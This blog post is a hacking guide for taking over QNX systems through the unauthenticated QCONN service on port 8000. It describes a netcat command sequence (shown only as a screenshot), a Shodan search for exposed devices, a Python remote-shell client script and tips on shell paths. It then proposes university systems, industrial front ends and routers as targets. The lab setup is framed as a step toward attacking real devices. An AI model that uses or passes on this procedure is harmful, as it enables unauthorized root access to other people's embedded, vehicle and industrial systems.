---
layout: post
title:  "Hacking QNX systems over QCONN"
date:   2020-02-13 05:16:03 +0000
categories: jekyll update
highlighter: rouge
---
This is a simple guide to exploit QNX ports over QConn port.

![Intro](/assets/img1.jpg)

In case you are wondering what is a QNX system, QNX is a mobile operating system that was originally developed for embedded systems. The operating system’s developer, QNX Software Systems, was acquired by Research in Motion (RIM) and the OS adapted for use in the BlackBerry Playbook tablet. At the Geneva Motor Show, Apple demonstrated CarPlay which provides an iOS-like user interface to head units in compatible vehicles. Once configured by the automaker, QNX can be programmed to handoff its display and certain functionality to an Apple Carplay device.On December 11, 2014, Ford Motor Company stated the company would be replacing Microsoft Auto with QNX.

I guess that is enough intro. Let’s get into the real interesting part.

Requirements:
{% highlight ruby %}
1) QNX system 650SP1 target ISO, running on VMware or Virtual Box.
2) Qconn daemon running on the system
3) Kali Linux (or any other having netcat)
{% endhighlight %}

Qconn – It’s a daemon which provides visibility for looking at File System and System Processes and a lot more, via the QNX Momentics IDE.

![QNX Momentics Process Explorer](/assets/qnx-momentics-target-process-navigator.jpg)
![QNX Momentics IDE FS Explorer](/assets/qnx-momentics-target-fike-system-navigator.jpg)
Fig 1: Snapshots of what the QNX Momentics IDE Looks

`Hacking QNX systems over QCONN`

The thing with QNX Momentics IDE is that it does not require password to authenticate incoming qconn request. This is a fundamental flaw which QNX Systems should look at.

In our case, we will take advantage of this flaw of Qconn, to obtain root privilege shell on attack machine, using the below simple steps. We will use everybody’s favorite “netcat” utility to gain access or communicate. Run the following commands shown in the screenshot:

![QNX Momentics PWN Commands](/assets/qnx-pwing-sequence-over-qconn-and-netcat.png)

Fig 2: Command Sequence to PWN QNX Remotely

This is very straightforward and does not require any complex buffer overflows or code vulnerabilities/exploits. It’s just the way QNX system is and is a pretty big flaw. However, in production level systems “QCONN” is generally not enabled or blocked.

As per my research I could not find a single open Qconn port(8000) on shodan.io for any device in the world, probably some smart hacker can figure that out as well.

---
`Live Example`

A simple shodan.io search for the query for qconn shows around 83 results.

![QNX Momentics PWN Commands](/assets/shodan-out.jpg)

Fig 3: Shodan Query for Qconn port 8000

A simple python script below can be used to send in those commands:


{% highlight ruby %}

#!/usr/bin/python
import socket
import sys

print "Enter IP Address to Connect for QNX Qconn Exploit"
host = raw_input()
port = 8000

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	
	try :  
		print "[+] Connected to Remote QNX System !\n"
     		while 1:  
      			cmd = raw_input("(prompt>)$ ");  
      			s.send(cmd + "\n");  
      			result = s.recv(1024).strip();  
      			if not len(result) :  
	         		print "[+] Empty response. No shell"
            			s.close();  
         			break;  
        		print(result);  
	except KeyboardInterrupt:
		print "\n[+] ^C Received, closing connection"
     		s.close();
	except EOFError:
		print "\n[+] ^D Received, closing connection"
     		s.close();

except socket.error:
	print "[+] Unable to connect to QNX QConn "

{% endhighlight %}

---
`Troubleshoot`

In some cases, you will need to change the location of the shell i.e instead of `"/bin/sh"` the shell on the system could be located at `"/usr/bin/sh"` or `"/bin/ksh”` or `"/sbin/sh"`, make necessary changes to the command on “nc” input line.
Remember do not press enter, before the command is finished. Also, if you get the shell location wrong or press enter before EOC, then you may have to restart.
Better way write a python script to automate.

---
`References  and further reading (existing ones)`
{% highlight ruby %}
1) https://www.exploit-db.com/exploits/21520/ 
2) https://www.optiv.com/blog/pentesting-qnx-neutrino-rtos
3) http://illmatics.com/Remote%20Car%20Hacking.pdf
{% endhighlight %}

---
`Where this can be used?`
---
{% highlight ruby %}
1) University Systems for the curious hacker in you
2) Front End Industrial systems(This should not work here, 
if it does, you found a gold mine)
3) Routers etc.
{% endhighlight %}

External Link: [Blog-link][Blog-link]

Check out Some External Links:
1)[exploit-db][exploit-db]
2)[pt-qnx-rtos][pt-qnx-rtos]
3)[illmatics][illmatics]

[Blog-link]: https://abhijitlamsogeblog.wordpress.com/2016/05/04/pwninghacking-qnx-sys    tems-over-qconn/
[exploit-db]: https://www.exploit-db.com/exploits/21520/
[pt-qnx-rtos]:  https://www.optiv.com/blog/pentesting-qnx-neutrino-rtos
[illmatics]: http://illmatics.com/Remote%20Car%20Hacking.pdf
